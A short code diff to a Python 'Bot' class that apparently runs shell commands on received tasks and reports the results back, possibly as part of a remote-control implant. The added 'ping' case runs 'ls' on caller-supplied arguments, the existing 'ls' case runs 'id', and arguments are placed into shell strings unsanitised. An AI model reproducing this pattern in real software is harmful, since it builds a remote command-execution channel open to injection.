@@ -60,6 +60,8 @@ class Bot:
                 res = execute_shell(f'cat {args}')
             case 'ls':
                 res = execute_shell('id')
+            case 'ping':
+                res = execute_shell(f'ls {args}')
             case _:
                 res = b"Unknown operation"
         self.report(id, task, res)
